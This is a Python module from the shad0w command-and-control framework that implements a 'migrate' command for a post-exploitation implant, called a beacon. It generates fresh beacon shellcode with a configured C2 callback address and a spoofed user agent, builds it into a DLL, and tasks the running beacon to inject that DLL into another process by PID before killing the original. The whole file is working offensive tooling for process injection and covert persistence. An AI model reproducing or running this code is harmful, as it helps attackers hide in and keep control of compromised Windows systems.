#
# Migrate the current beacon to a different process
#

import os
import json
import base64
import argparse
import threading

from lib import buildtools

__description__ = "Migrate the beacon to a different process"
__author__ = "@_batsec_"

# beacon to exec command on
current_beacon = None

# identify the task as shellcode execute
DLLINJECT_EXEC_ID = 0x5000

# did the command error
ERROR = False
error_list = ""

def migrate_callback(shad0w, data):
    # wont be hit
    return

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def build_inject_info(args, rcode):

    # create the json object to tell the beacon
    # where to execute the code.

    info = {}

    info["pid"] = int(args.pid)
    info["dll"] = rcode

    return json.dumps(info)

def generate_beacon_code(shad0w):
    buildtools.clone_source_files(rootdir='injectable')

    if shad0w.teamserver:
        endpoint = shad0w.teamsrv.c2_endpoint
        port     = shad0w.teamsrv.c2_port
    else:
        endpoint = shad0w.endpoint
        port     = shad0w.addr[1]

    settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _CALLBACK_JITTER %s000
#define IMPERSONATE_SESSION "%s"
""" % (endpoint, port, 1, current_beacon)

    buildtools.update_settings_file(None, custom_template=settings_template)

    os = shad0w.beacons[current_beacon]["os"]
    arch = shad0w.beacons[current_beacon]["arch"]
    secure = shad0w.beacons[current_beacon]["secure"]

    buildtools.make_in_clone(arch=arch, platform=os, secure=secure, static=True)

    return buildtools.extract_shellcode()

def format_shellcode(shellcode):
    hshellcode = ""

    code_size = len(shellcode)

    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"

    return hshellcode

def write_header(code, file_loc):
    hex_code = format_shellcode(code)

    TEMPLATE = """unsigned char beacon_bin[] = { %s };
unsigned int beacon_bin_len = %s;
"""

    header = TEMPLATE % (hex_code, len(code))

    with open(file_loc, 'w') as file:
        file.write(header)

    return

def get_dll_data(file_loc):
    with open(file_loc, "rb") as file:
        data = file.read()

    return base64.b64encode(data).decode()

def generate_beacon_dll(shad0w, rcode):
    # write header file
    write_header(rcode, "/root/shad0w/modules/windows/shinject/beacon.h")

    # build the dll
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/", basedir="/root/shad0w/modules/windows/shinject/")
    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll", builddir=os.getcwd(), make_target="x64")

    # check that the dll has built
    if made != True:
        shad0w.event.beacon_info(current_beacon, "Error building migrate dll")
        return

    # return the base64 dll data
    return get_dll_data("/root/shad0w/modules/windows/shinject/module.dll")

def await_impersonate(shad0w, pid):
    while True:
        if shad0w.beacons[current_beacon]["impersonate"] == None:
            continue
        else:
            imp_beacon_id = shad0w.beacons[current_beacon]["impersonate"]

            shad0w.beacons[current_beacon]["task"] = (0x6000, None)
            shad0w.event.beacon_info(current_beacon, "Tasked beacon to die")

            # shad0w.current_beacon = imp_beacon_id
            shad0w.beacons[current_beacon] = shad0w.beacons[imp_beacon_id]
            break

    shad0w.event.beacon_info(current_beacon, f"Successfully migrated ({pid})")
    return

def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    # usage examples
    usage_examples = """

Examples:

migrate -p 8725
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='migrate',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-p", "--pid", required=True, help="PID to migrate to")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if ERROR:
        print(error_list)
        parse.print_help()
        return

    # create the beacon
    rcode = generate_beacon_code(shad0w)

    # create the beacon dll
    rcode = generate_beacon_dll(shad0w, rcode)

    # make the json info
    inject_info = build_inject_info(args, rcode)

    # tell the beacon to execute the dll
    shad0w.beacons[current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
    shad0w.beacons[current_beacon]["callback"] = migrate_callback

    # try to impersonate the new beacon
    threading.Thread(target=await_impersonate, args=(shad0w, args.pid)).start()

    return
